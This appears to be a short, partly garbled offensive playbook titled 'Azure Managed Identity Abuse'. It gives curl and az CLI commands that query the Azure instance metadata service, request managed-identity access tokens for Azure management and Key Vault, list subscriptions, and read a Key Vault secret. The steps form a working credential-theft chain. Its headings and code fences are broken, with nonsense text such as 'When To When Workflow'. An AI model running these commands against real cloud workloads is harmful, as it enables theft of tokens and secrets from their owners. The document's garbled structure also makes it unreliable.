# Azure Managed Identity Abuse

## When to Use
- When To When Workflow

### Phase 1: Validating the Environment

```bash
# Concept: 1. curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 2. ```

### Phase 2: Requesting Azure AD Tokens

```bash
# Concept: curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true > token.json

# curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true > vault_token.json

# ```

### Phase 3: Abusing the Associated Privileges

```bash
# 1. curl -H "Authorization: Bearer <TOKEN>" https://management.azure.com/subscriptions?api-version=2020-01-01

# 2. CONNECT az CLI az login --identity
az keyvault secret show --name MySecret --vault-name TargetVault
```
